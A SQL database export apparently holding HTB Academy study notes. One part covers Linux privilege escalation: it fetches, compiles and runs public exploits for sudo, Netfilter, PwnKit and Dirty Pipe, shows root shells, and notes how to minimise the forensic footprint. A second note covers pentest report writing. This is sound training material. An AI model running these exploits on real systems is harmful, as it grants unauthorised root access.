HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
```

### Python Library Hijacking — Fixing a Corrupted Module File

If you inject code into a module file multiple times or make a syntax error during injection, the module file can become corrupted and Python will refuse to import it, breaking the script entirely. Diagnose corruption using ast.parse which reports syntax errors with line numbers. Then inspect the lines around the reported error to identify duplicate or malformed injections. Use a Python script to view specific line ranges and another to remove the corrupted lines while keeping everything else intact. Always keep a backup of any module file before modifying it.

```bash
$ python3 -c "import ast; ast.parse(open(''/usr/local/lib/python3.8/dist-packages/psutil/__init__.py'').read())"

$ grep -n "import os" /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

```python
$ python3 << ''EOF''
with open(''/usr/local/lib/python3.8/dist-packages/psutil/__init__.py'', ''r'') as f:
    lines = f.readlines()
for i, line in enumerate(lines[1918:1932], start=1919):
    print(f"{i}: {repr(line)}")
EOF
```

```python
$ python3 << ''EOF''
with open(''/usr/local/lib/python3.8/dist-packages/psutil/__init__.py'', ''r'') as f:
    lines = f.readlines()

new_lines = []
for i, line in enumerate(lines):
    if 1920 <= i+1 <= 1928 and (''import os'' in line or ''os.system'' in line) and i+1 != 1920:
        continue
    new_lines.append(line)

with open(''/usr/local/lib/python3.8/dist-packages/psutil/__init__.py'', ''w'') as f:
    f.writelines(new_lines)
print("Done")
EOF
```

---

## Sudo — Overview and /etc/sudoers

Sudo is used on Unix-based operating systems to start processes with the rights of another user, most commonly root. It serves as an additional security layer to prevent unauthorized damage to the system by requiring explicit permission grants rather than giving users direct root access. The /etc/sudoers file specifies which users or groups are allowed to run specific programs and with what privileges. Lines in sudoers follow the format user HOST=(runas_user) command. The ALL=(ALL:ALL) ALL entry grants unrestricted sudo access. The %sudo ALL=(ALL:ALL) ALL entry grants sudo access to all members of the sudo group. Individual entries like cry0l1t3 ALL=(ALL) /usr/bin/id restrict a user to only running specific commands with sudo. Always read the full sudoers output carefully — individual command restrictions are frequently misconfigured in exploitable ways.

```bash
$ sudo cat /etc/sudoers | grep -v "#" | sed -r ''/^\s*$/d''

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
```

---

## Sudo — CVE-2021-3156 Baron Samedit

CVE-2021-3156 is a heap-based buffer overflow vulnerability in sudo that had been present for over ten years before discovery. It affected sudo versions 1.8.31 on Ubuntu 20.04, 1.8.27 on Debian 10, and 1.9.2 on Fedora 33 among others. The vulnerability allows any local user to gain root privileges without needing any sudo permissions at all — it does not matter what is in the sudoers file. This makes it especially powerful because it bypasses sudo''s permission model entirely by exploiting the sudo binary itself at a memory corruption level. The exploit has publicly available PoC code and is straightforward to compile and execute. The first step is identifying the exact sudo version and the OS version, then running the exploit with the appropriate target ID.

```bash
$ sudo -V | head -n1
Sudo version 1.8.31

$ cat /etc/lsb-release
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal

$ git clone https://github.com/blasty/CVE-2021-3156.git
$ cd CVE-2021-3156
$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o ''libnss_X/P0P_SH3LLZ_ .so.2'' lib.c

$ ./sudo-hax-me-a-sandwich

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa)   - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster)           - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

$ ./sudo-hax-me-a-sandwich 1

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
** pray for your rootshell.. **

# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Sudo — CVE-2019-14287 Policy Bypass

CVE-2019-14287 is a sudo policy bypass vulnerability affecting all versions below 1.8.28. It requires only one prerequisite — the user must have a sudo entry that allows running any command, even a specific one. The vulnerability abuses the way sudo handles user IDs specified with the -u flag. Sudo normally allows specifying a user by name or ID to run commands as that user. However when a negative ID of -1 is passed, sudo incorrectly processes it as user ID 0 (root) due to an integer conversion error. This means that if your sudo entry allows you to run any command at all — even something as harmless as /usr/bin/id — you can use -u#-1 to run it as root instead of your own user.

```bash
$ sudo -l

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id

$ cat /etc/passwd | grep cry0l1t3
cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash

$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id
uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

The -u#-1 flag tells sudo to run the command as user ID -1, which is incorrectly processed as 0 (root) by vulnerable versions.

---

## Netfilter

Netfilter is a Linux kernel module that provides packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and configured rules. Netfilter acts as a software layer in the Linux kernel — when network packets are received and sent, it initiates the execution of other modules such as packet filters. Programs like iptables and arptables serve as action mechanisms of the Netfilter hook system for the IPv4 and IPv6 protocol stacks. The three main functions of Netfilter are packet defragmentation, connection tracking, and network address translation (NAT). Several serious privilege escalation vulnerabilities have been discovered in Netfilter including CVE-2021-22555 in 2021, CVE-2022-25636 in 2022, and CVE-2023-32233 in 2023. These are particularly relevant because many companies run older unpatched Linux distributions in production due to compatibility requirements with their software applications.

### Netfilter — CVE-2021-22555

CVE-2021-22555 affects Linux kernel versions 2.6 through 5.11. It exploits a heap out-of-bounds write vulnerability in the Netfilter subsystem''s socket option handling. The exploit uses a namespace sandbox to set up the necessary conditions, then corrupts heap memory in multiple stages to eventually gain kernel code execution and escalate to root. The exploit is compiled as a 32-bit binary using the -m32 flag and linked statically to avoid library dependency issues. Confirm the kernel version is within the vulnerable range with uname -r before downloading and compiling the exploit source.

```bash
$ uname -r
5.10.5-051005-generic

$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c

$ gcc -m32 -static exploit.c -o exploit

$ ./exploit

[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[+] fake_idx: fff
[+] real_idx: fdf
<SNIP>

root@ubuntu:/home/cry0l1t3# id
uid=0(root) gid=0(root) groups=0(root)
```

### Netfilter — CVE-2022-25636

CVE-2022-25636 affects Linux kernel versions 5.4 through 5.6.10 in the net/netfilter/nf_dup_netdev.c component. It is a heap out-of-bounds write vulnerability that grants root privileges to local users. The exploit leaks kernel pointers, sprays kernel memory structures, causes a use-after-free condition to rewrite key kernel data, and uses ROP (Return Oriented Programming) chains to gain code execution as root. This exploit is particularly dangerous because it can corrupt the kernel and make the system unstable, potentially requiring a reboot. Always be cautious running this against any system you cannot easily restart, and never run it against production systems without authorisation and a maintenance window.

```bash
$ uname -r
5.13.0-051300-generic

$ git clone https://github.com/Bonfee/CVE-2022-25636.git
$ cd CVE-2022-25636
$ make
$ ./exploit

[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr
[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[*] STEP 4: Leak kaslr
[*] kaslr base: 0xffffffff80ffefa0
[*] STEP 6: rop :)

# id
uid=0(root) gid=0(root) groups=0(root)
```

### Netfilter — CVE-2023-32233

CVE-2023-32233 exploits a Use-After-Free (UAF) vulnerability in the nf_tables component of the Linux kernel up to version 6.3.1. The nf_tables subsystem uses anonymous sets as temporary workspaces for processing batch requests. Once processing completes these anonymous sets are supposed to be cleared and made inaccessible. Due to a coding mistake the cleared anonymous sets are not properly invalidated and can still be accessed and modified after being freed — this is the Use-After-Free condition. The exploit manipulates the system to use these freed memory regions to interact with kernel memory structures, ultimately gaining the ability to overwrite kernel function pointers and execute arbitrary code as root. The exploit uses the libmnl and libnftnl libraries for netlink communication and requires them to be installed for compilation.

```bash
$ git clone https://github.com/Liuk3r/CVE-2023-32233
$ cd CVE-2023-32233
$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl

$ ./exploit

[*] Netfilter UAF exploit
[*] Checking for available CPUs...
[*] Reserved CPU 0 for PWN Worker
[*] Creating "/tmp/modprobe"...
[*] Signaling PWN Worker...
<SNIP>
[*] You''ve Got ROOT:-)

# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Polkit

PolicyKit (polkit) is an authorization service on Linux-based operating systems that manages communication between user-level software and privileged system components. It determines whether a user application is authorized to perform a specific system-level action without needing to run the entire application as root. Polkit works with two groups of files — actions and policies stored in /usr/share/polkit-1/actions/ which define what privileged operations exist, and rules stored in /usr/share/polkit-1/rules.d/ which define who can perform those operations and under what conditions. Custom local authority rules can be placed in /etc/polkit-1/localauthority/50-local.d/ with the .pkla extension. The three main polkit tools are pkexec which runs a program with the rights of another user or root (equivalent to sudo), pkaction which displays available actions, and pkcheck which checks if a process is authorized for a specific action. The most interesting for privilege escalation is pkexec.

```bash
$ pkexec -u root id
uid=0(root) gid=0(root) groups=0(root)
```

### Polkit — CVE-2021-4034 PwnKit

CVE-2021-4034, known as PwnKit, is a memory corruption vulnerability in the pkexec tool that was hidden for over ten years before discovery and disclosure in November 2021. It was fixed two months later in January 2022. The vulnerability allows any unprivileged local user to gain full root privileges on any Linux system that has polkit installed — which is essentially every major Linux distribution. The exploit works by corrupting the argument list passed to pkexec in a way that causes it to unsafely import environment variables, which can then be used to load a malicious shared library with root privileges. The PoC is available on GitHub and is straightforward to compile and run directly on the target system. Because this vulnerability existed for over a decade, any unpatched system regardless of its apparent security posture is likely vulnerable.

```bash
$ git clone https://github.com/arthepsy/CVE-2021-4034.git
$ cd CVE-2021-4034
$ gcc cve-2021-4034-poc.c -o poc

$ ./poc

# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Dirty Pipe — CVE-2022-0847

Dirty Pipe is a vulnerability in the Linux kernel named for its similarity to the older Dirty COW (CVE-2016-5195) vulnerability. It affects all kernel versions from 5.8 to 5.17. The vulnerability allows any user with read access to a file to write arbitrary data into that file — including root-owned files. This works because of a flaw in how the Linux pipe mechanism handles memory pages. Pipes are a unidirectional inter-process communication mechanism — the vulnerability arises from incorrect initialisation of the flags member in new pipe buffer structures, allowing a user to overwrite page cache data for files they only have read access to. Android phones are also affected because Android apps run with user rights and a malicious app could exploit this to gain device control. Two exploit variants are available — the first modifies /etc/passwd to remove the root password, and the second hijacks a SUID binary to get a root shell.

### Dirty Pipe — Checking Kernel Version and Compiling

The first step is confirming the kernel version falls within the vulnerable range of 5.8 to 5.17. The uname -r command shows the running kernel version. Kernel 5.13.0 confirmed as vulnerable. Download the exploit repository which contains multiple exploit variants along with a compile script. Run bash compile.sh which compiles both exploit variants. The compile script handles all the required flags and dependencies automatically.

```bash
$ uname -r
5.13.0-46-generic

$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
$ cd CVE-2022-0847-DirtyPipe-Exploits
$ bash compile.sh
```

### Dirty Pipe — Exploit 1: Modifying /etc/passwd

The first exploit variant directly modifies /etc/passwd to remove the password hash for the root account, replacing it with an empty field. When the password field in /etc/passwd is empty the system accepts any password (or no password) for that account via the su command. The exploit backs up the original /etc/passwd, patches it, drops you into a root shell, and then automatically restores the original file when you exit — minimising the forensic footprint of the attack. This is useful when you want a quick root shell and can tolerate briefly modifying a sensitive system file.

```bash
$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell...

id
uid=0(root) gid=0(root) groups=0(root)
```

### Dirty Pipe — Exploit 2: SUID Binary Hijacking

The second exploit variant uses the Dirty Pipe write primitive to temporarily overwrite the content of a SUID binary with a root shell payload, executes it to get a root shell, and then restores the original binary. This approach is stealthier than modifying /etc/passwd in some respects because it targets a binary rather than a user database file. The first step is finding all SUID binaries on the system using find. Then pass the full path of any SUID binary as an argument to exploit-2. The exploit overwrites it with a shell dropper, executes it, and restores the original. A cleanup file /tmp/sh is created and you are reminded to remove it after the session.

```bash
$ find / -perm -4000 2>/dev/null

/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/su
<SNIP>

$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),1000(cry0l1t3)

# rm /tmp/sh
```

', NULL, 'PUBLISHED', 'PUBLIC', 131, 'cmvcsa9i0000hidr0sh1y58oz', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792407604.863), to_timestamp(1792407604.863), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvfo2ey600a1ida0np0k3vox', 'Documentation & Reporting — Pentest Report Writing Notes', 'documentation-reporting-pentest-report-writing-notes', 'Complete notes on notetaking, evidence handling, report types, writing an attack chain, executive summaries, findings, QA, and client communication for penetration test reporting — plus a bonus guide on documenting CTFs and exporting Markdown notes to PDF.', '# Documentation & Reporting — Complete Notes (HTB Academy)

---

## Table of Contents

1. [Introduction to Documentation and Reporting](#1-introduction-to-documentation-and-reporting)
   - 1.1 [Documentation & Reporting in Practice](#11-documentation--reporting-in-practice)
   - 1.2 [About this Module](#12-about-this-module)
2. [Notetaking & Organization](#2-notetaking--organization)
   - 2.1 [Notetaking Sample Structure](#21-notetaking-sample-structure)
   - 2.2 [Notetaking Tools](#22-notetaking-tools)
   - 2.3 [Logging (Tmux Logging Setup)](#23-logging-tmux-logging-setup)
   - 2.4 [Artifacts Left Behind](#24-artifacts-left-behind)
   - 2.5 [Account Creation / System Modifications](#25-account-creation--system-modifications)
   - 2.6 [Evidence — What to Capture](#26-evidence--what-to-capture)
   - 2.7 [Storage — Folder Structure](#27-storage--folder-structure)
   - 2.8 [Formatting and Redaction](#28-formatting-and-redaction)
   - 2.9 [Screenshots](#29-screenshots)
   - 2.10 [Terminal Redaction](#210-terminal-redaction)
   - 2.11 [What Not to Archive](#211-what-not-to-archive)
   - 2.12 [Module Exercises](#212-module-exercises)
3. [Types of Reports](#3-types-of-reports)
   - 3.1 [Vulnerability Assessment](#31-vulnerability-assessment)
   - 3.2 [Penetration Testing](#32-penetration-testing)
   - 3.3 [Inter-Disciplinary Assessments](#33-inter-disciplinary-assessments)
   - 3.4 [Draft Report](#34-draft-report)
   - 3.5 [Final Report](#35-final-report)
   - 3.6 [Post-Remediation Report](#36-post-remediation-report)
   - 3.7 [Attestation Report](#37-attestation-report)
   - 3.8 [Other Deliverables](#38-other-deliverables)
   - 3.9 [Vulnerability Notifications](#39-vulnerability-notifications)
4. [Components of a Report](#4-components-of-a-report)
   - 4.1 [Prioritizing Our Efforts](#41-prioritizing-our-efforts)
   - 4.2 [Writing an Attack Chain](#42-writing-an-attack-chain)
   - 4.3 [Writing a Strong Executive Summary](#43-writing-a-strong-executive-summary)
   - 4.4 [Summary of Recommendations](#44-summary-of-recommendations)
   - 4.5 [Findings Section Overview](#45-findings-section-overview)
   - 4.6 [Appendices](#46-appendices)
   - 4.7 [Report Type Differences](#47-report-type-differences)
5. [How to Write Up a Finding](#5-how-to-write-up-a-finding)
   - 5.1 [Breakdown of a Finding](#51-breakdown-of-a-finding)
   - 5.2 [Showing Finding Reproduction Steps Adequately](#52-showing-finding-reproduction-steps-adequately)
   - 5.3 [Effective Remediation Recommendations](#53-effective-remediation-recommendations)
   - 5.4 [Selecting Quality References](#54-selecting-quality-references)
   - 5.5 [Example Findings](#55-example-findings)
   - 5.6 [Poorly Written Finding](#56-poorly-written-finding)
   - 5.7 [Hands-On Practice — WriteHat](#57-hands-on-practice--writehat)
6. [Reporting Tips and Tricks](#6-reporting-tips-and-tricks)
   - 6.1 [Templates](#61-templates)
   - 6.2 [MS Word Tips & Tricks](#62-ms-word-tips--tricks)
   - 6.3 [Automation (Macros)](#63-automation-macros)
   - 6.4 [Reporting Tools / Findings Database](#64-reporting-tools--findings-database)
   - 6.5 [Misc Tips & Tricks](#65-misc-tips--tricks)
   - 6.6 [Client Communication](#66-client-communication)
   - 6.7 [Presenting Your Report — QA Process](#67-presenting-your-report--qa-process)
   - 6.8 [Report Review Meeting](#68-report-review-meeting)
7. [Documentation & Reporting Practice Lab](#7-documentation--reporting-practice-lab)
   - 7.1 [Lab Scenario and Scope](#71-lab-scenario-and-scope)
   - 7.2 [Lab Tasks to Practice](#72-lab-tasks-to-practice)
8. [Beyond this Module](#8-beyond-this-module)
   - 8.1 [Practicing](#81-practicing)
   - 8.2 [Next Steps](#82-next-steps)
9. [Bonus: Creating Proper CTF Documentation (PDF-Ready)](#9-bonus-creating-proper-ctf-documentation-pdf-ready)
   - 9.1 [Why You Should Document CTFs Like a Real Pentest](#91-why-you-should-document-ctfs-like-a-real-pentest)
   - 9.2 [Suggested CTF Report / Writeup Structure](#92-suggested-ctf-report--writeup-structure)
   - 9.3 [Example Markdown Template You Can Copy](#93-example-markdown-template-you-can-copy)
   - 9.4 [Turning Your Markdown Notes into a PDF — Step by Step](#94-turning-your-markdown-notes-into-a-pdf--step-by-step)
   - 9.5 [Tips for HTB Academy / Exam Report Submissions](#95-tips-for-htb-academy--exam-report-submissions)

---

# 1. Introduction to Documentation and Reporting

Documentation and reporting are soft skills, but they matter just as much as technical hacking skills. If you cannot clearly explain what you did, how you did it, and what the impact is, then the technical work loses most of its value to a client or to a grader. This module teaches you a repeatable formula for taking notes, organizing evidence, and writing reports that are useful to both technical and non-technical readers. The authors built this module from roughly 25 combined years of consulting experience, so the advice reflects real client situations rather than just theory. The key mindset to adopt is that a penetration test is only a "snapshot in time" — things can change the moment testing ends, so your report should say so clearly.

A good report overview section should state who performed the test, what IP addresses were used, how testing was done (remote VPN vs on-site), and the exact date range of testing. This protects both you and the client because it sets expectations about what the report does and does not cover. For example you might write: "All testing activities were performed between January 7, 2022 and January 19, 2022," followed by a disclaimer that the report is only valid for that window of time.

## 1.1 Documentation & Reporting in Practice

This part of the module shares three real stories to prove why documentation matters, even though the topic feels boring compared to actual hacking. In short: good notes and logs have saved careers, client relationships, and entire projects from going wrong. Below is a summary of each story and the lesson learned.

**Scenario 1 — The Case of an Exploding VM**
A tester''s VM completely crashed mid-engagement and the filesystem was unrecoverable. Because they had been syncing their notes and evidence to a shared company drive every day (a habit learned from a senior teammate), they simply rebuilt their VM from a template and resumed testing with zero data loss. The lesson: always back up your evidence somewhere outside your single testing VM, and do it daily, not just at the end of the engagement.

**Scenario 2 — Ping of Death**
During an internal test, a hostile client IT staff member accused the tester of crashing critical servers. Because the tester had kept full logs, scope files, and raw scan data, they could prove the affected IPs were explicitly within the agreed scope. The lesson learned afterward: always ask the client for a specific list of hosts/IPs to exclude from testing, even if they are technically in scope, to avoid this kind of dispute in the future.

**Scenario 3 — Slow as Molasses**
A skeptical network admin blamed the tester''s scans for slowing down the entire network. By sharing scan output as evidence, the tester proved they followed best practices — the real cause turned out to be debug mode left on across network devices combined with normal Nmap traffic. The lesson: documentation protects you from being wrongly blamed and can even help the client find real misconfigurations they didn''t know about.

The overall takeaway from all three stories is that strong documentation lets you justify your actions, produce evidence on demand, and avoid having to redo lost work — which protects your reputation, your client relationship, and your job.

## 1.2 About this Module

This section explains the practical resources that come bundled with the module and how to get the most value from it. A sample Obsidian notebook and a sample Internal Penetration Test report (available in both Word and PDF format) are provided in the Resources tab; the zip password is **hackthebox**. These samples are meant to be kept as personal references even after finishing the module. None of the practical exercises in the module are mandatory, but working through them is strongly recommended to find gaps in your own current process.

A pre-configured attack host and a small lab are also provided so you can simulate a full Internal Penetration Test and practice documenting it from start to finish, as many times as you like until you are comfortable. Throughout this module, "an internal" means an Internal Penetration Test and "an external" means an External Penetration Test — this shorthand is used repeatedly in later sections, so keep it in mind as you read on.

---

# 2. Notetaking & Organization

Thorough notetaking is the raw material behind every report you will ever write. Your notes, screenshots, and tool output are what eventually get turned into polished findings and executive summaries — and in most cases, the report is the only thing the client actually sees of your work. Even though notes are personal, they still need to be organized and repeatable because a disorganized note style costs you time later and makes it harder for a teammate to step in if needed. Being overly detailed in your notes never hurts, especially if a client later asks "did you scan X host on Y day?" and you need to answer confidently with evidence.

## 2.1 Notetaking Sample Structure

There is no single correct notetaking structure — it depends on you, the project, and the type of assessment. However, the module recommends a baseline set of categories that work well for most internal/external penetration tests. Below is what each category is for, explained simply:

- **Attack Path** — A step-by-step outline of how you got from zero access to full compromise, with screenshots/command output included so it''s easy to paste into the final report later.
- **Credentials** — One central place to store every username, password, and secret you find during testing.
- **Findings** — A dedicated subfolder for each finding, containing your write-up narrative plus all supporting evidence (screenshots, command output).
- **Vulnerability Scan Research** — Notes on what you tried against vulnerability scan results, so you don''t waste time repeating research.
- **Service Enumeration Research** — Notes on which services you investigated, what failed, and what looked promising.
- **Web Application Research** — Notes on interesting web apps found (e.g. via subdomain brute-forcing), including credentials tried and screenshots taken with tools like Aquatone or EyeWitness.
- **AD Enumeration Research** — Step-by-step record of what Active Directory enumeration you''ve done and what still needs follow-up.
- **OSINT** — Notes on anything interesting found through open-source intelligence gathering.
- **Administrative Information** — Contact info for PMs/POCs, Rules of Engagement details, and a running to-do list of testing ideas.
- **Scoping Information** — All in-scope IPs/CIDR ranges, URLs, and any credentials given by the client, so you never accidentally test outside scope.
- **Activity Log** — A high-level timeline of everything you did, useful for correlating events if the client asks about an incident.
- **Payload Log** — A record of every payload used, which host it went on, its file path, and whether it was cleaned up (with a file hash for easy searching).

## 2.2 Notetaking Tools

There''s no single "best" notetaking tool — it''s entirely personal preference, and the module lists many popular options: CherryTree, Notion, Notepad++, Obsidian, Visual Studio Code, GitBook, OneNote, Cryptpad, Evernote, Sublime Text, Outline, and Standard Notes. The most important decision isn''t the specific tool, but whether it stores data **locally** or in the **cloud**. Cloud tools are fine for training, CTFs, and labs, but for real client engagements you need to check your company''s data storage policy before choosing a tool, since client data often has contractual or compliance restrictions.

The module highlights **Obsidian** as an excellent local-storage tool and **Outline** as a strong cloud option (which also has a self-hosted version). Both support exporting to Markdown, which means your notes can always be moved into another tool later without losing formatting. The practical advice is: experiment with different tools while doing Academy modules, HTB boxes, and labs until you find a setup you''re comfortable with, since requirements often vary by company anyway.

## 2.3 Logging (Tmux Logging Setup)

It is essential to log all scanning and exploitation attempts so you have raw proof of your work even if your written notes miss something. Tmux logging is the recommended approach because it saves everything typed into a Tmux pane to a log file automatically. This is especially important for engagements with few findings, since you can show the client a narrative of everything you tried that didn''t work, proving thoroughness. Below is the full step-by-step setup process explained simply.

**Step 1 — Clone the Tmux Plugin Manager (TPM) into your home directory.**
This downloads the plugin manager tool that lets Tmux install extra plugins like the logging plugin.
```bash
git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
```

**Step 2 — Create a `.tmux.conf` configuration file in your home directory.**
This is the file Tmux reads on startup to know which plugins and settings to load.
```bash
touch .tmux.conf
```

**Step 3 — Add the following plugin list into `.tmux.conf`.**
This tells Tmux to load the plugin manager itself, a "sensible defaults" plugin, and the logging plugin specifically.
```bash
# List of plugins
set -g @plugin ''tmux-plugins/tpm''
set -g @plugin ''tmux-plugins/tmux-sensible''
set -g @plugin ''tmux-plugins/tmux-logging''

# Initialize TMUX plugin manager (keep at bottom)
run ''~/.tmux/plugins/tpm/tpm''
```

**Step 4 — Reload the config file into your current Tmux session.**
This makes the settings you just wrote take effect without restarting Tmux entirely.
```bash
tmux source ~/.tmux.conf
```

**Step 5 — Start a new Tmux session.**
This opens a fresh Tmux session you can work and log inside of.
```bash
tmux new -s setup
```

**Step 6 — Install the plugins from inside the session.**
Press `Ctrl + B`, then `Shift + I` (this is `prefix + Shift + I`). Installation takes a few seconds.

**Step 7 — Start logging the current pane.**
Press `Ctrl + B`, then `Shift + P` (`prefix + Shift + P`). The bottom of the Tmux window will confirm logging is enabled along with the output file path. Repeat the same key combo (or type `exit`) to stop logging. Note: the log file only gets fully written once logging is stopped or the session ends.

**Retroactive logging (if you forgot to turn logging on):**
Press `Ctrl + B`, then `Alt + Shift + P` (`prefix + Alt + Shift + P`) to save the entire pane''s existing scrollback to a log file. This is limited by your Tmux `history-limit` setting — if it''s too low, you''ll lose earlier data. To raise the limit, add this line to `.tmux.conf`:
```bash
set -g history-limit 50000
```

**Capturing a single pane cleanly (useful with split windows):**
If you have two panes open (e.g. Responder in one, ntlmrelayx.py in another) and try to copy/paste normally, you''ll grab text from both panes and create a mess. Instead, use:
Press `Ctrl + B`, then `Alt + P` (`prefix + Alt + P`) to capture only the active pane''s output into a clean file.

**Splitting panes and moving between them:**
- Vertical split: `Ctrl + B` then `Shift + %` (`prefix + Shift + %`)
- Horizontal split: `Ctrl + B` then `Shift + "` (`prefix + Shift + "`)
- Move between panes: `Ctrl + B` then `O` (`prefix + O`)

**Clearing pane history:**
Press `Ctrl + B`, then `Alt + C` (`prefix + Alt + C`) to clear the scrollback buffer of the active pane.

**Recommended extra plugins:**
- `tmux-sessionist` — lets you switch, create, kill, or promote Tmux sessions easily.
- `tmux-pain-control` — gives more intuitive key bindings for moving/resizing/splitting panes.
- `tmux-resurrect` — restores your entire Tmux environment (sessions, windows, panes, running programs) after a restart.

## 2.4 Artifacts Left Behind

Whenever you drop a payload, web shell, or tool onto a target system, you must track it carefully. At minimum, record when the payload was used, which host it was placed on, the exact file path, and whether it has been (or still needs to be) cleaned up. It''s also best practice to record a file hash for every payload, since this makes it much easier for the client''s team to search for and confirm removal — even if you already deleted the file yourself.

## 2.5 Account Creation / System Modifications

If you create any accounts or change any system settings during testing, you must track those changes carefully in case they can''t be undone later. Record the following for each change:

- IP address / hostname of the affected host
- Timestamp of the change
- Description of the change
- Location on the host where the change was made
- Name of the application/service modified
- Name of any account created (and its password, in case the client needs it)

Always get **written approval** from the client before making this kind of change or performing any testing that could affect system stability — this is usually agreed upon during the project kickoff call.

## 2.6 Evidence — What to Capture

Clients are paying for the report, not for the exploit chain itself, so your evidence needs to clearly communicate the issue and let the client reproduce and validate it themselves. Without solid evidence, internal teams (sysadmins, developers, security staff) will struggle to confirm your findings or verify a fix later. You should capture evidence even for tests that **failed**, in case the client questions how thorough you were. For command-line work, prefer pasting raw terminal output over screenshots wherever possible — it is cleaner, easier to redact, and avoids massive bloated report files. For anything else (GUIs, web pages, etc.), use screenshots.

## 2.7 Storage — Folder Structure

Just like your notetaking structure, you need a consistent folder layout to store the raw evidence you collect. Without this, you risk missing data, violating scope, or wasting time redoing work — especially on large, time-boxed engagements. Below is the suggested baseline folder structure and what each folder is for:

- **Admin** — Scope of Work (SoW), kickoff meeting notes, status reports, vulnerability notifications.
- **Deliverables** — Where you keep report drafts, spreadsheets, and slide decks as you build them.
- **Evidence** — The main evidence container, broken down into:
  - **Findings** — One subfolder per finding, containing its evidence.
  - **Scans** — Broken further into **Vulnerability Scans**, **Service Enumeration** (Nmap, Masscan, Rumble exports), **Web** (Burp/ZAP state files, EyeWitness/Aquatone output), and **AD Enumeration** (BloodHound JSON, PowerView/ADRecon CSVs, PingCastle, Snaffler, CrackMapExec logs, Impacket output).
  - **Notes** — Your notetaking files live here.
  - **OSINT** — Output from tools like Intelx and Maltego.
  - **Wireless** — Optional folder for wireless testing tool output.
  - **Logging output** — Tmux, Metasploit, and other misc logs.
  - **Misc Files** — Web shells, payloads, custom scripts, and anything else relevant.
- **Retest** — Optional folder for a follow-up retest, mirroring the original structure.

**Step-by-step: creating this folder structure with one command**

**Step 1 — Create the entire nested directory tree in one go** using `mkdir -p` with brace expansion:
```bash
mkdir -p ACME-IPT/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,''AD Enumeration''},Notes,OSINT,Wireless,''Logging output'',''Misc Files''},Retest}
```
This single command creates every folder and subfolder shown in the structure above without needing to run `mkdir` repeatedly.

**Step 2 — Verify the structure visually** using the `tree` command:
```bash
tree ACME-IPT/
```
Example output:
```
ACME-IPT/
├── Admin
├── Deliverables
├── Evidence
│   ├── Findings
│   ├── Logging output
│   ├── Misc Files
│   ├── Notes
│   ├── OSINT
│   ├── Scans
│   │   ├── AD Enumeration
│   │   ├── Service
│   │   ├── Vuln
│   │   └── Web
│   └── Wireless
└── Retest
```

A tool like **Obsidian** lets you combine this exact folder structure with your notetaking vault, so you can browse and edit notes directly inside the same directories you use for evidence storage. In a real assessment, you''d end up with a populated set of Markdown pages, one per topic/finding, e.g.:
```
tree
.
└── Inlanefreight Penetration Test
    ├── Admin
    ├── Deliverables
    ├── Evidence
    │   ├── Findings
    │   │   ├── H1 - Kerberoasting.md
    │   │   ├── H2 - ASREPRoasting.md
    │   │   ├── H3 - LLMNR&NBT-NS Response Spoofing.md
    │   │   └── H4 - Tomcat Manager Weak Credentials.md
    │   ├── Notes
    │   │   ├── 1. Administrative Information.md
    │   │   ├── 2. Scoping Information.md
    │   │   ├── 3. Activity Log.md
    │   │   ├── 4. Payload Log.md
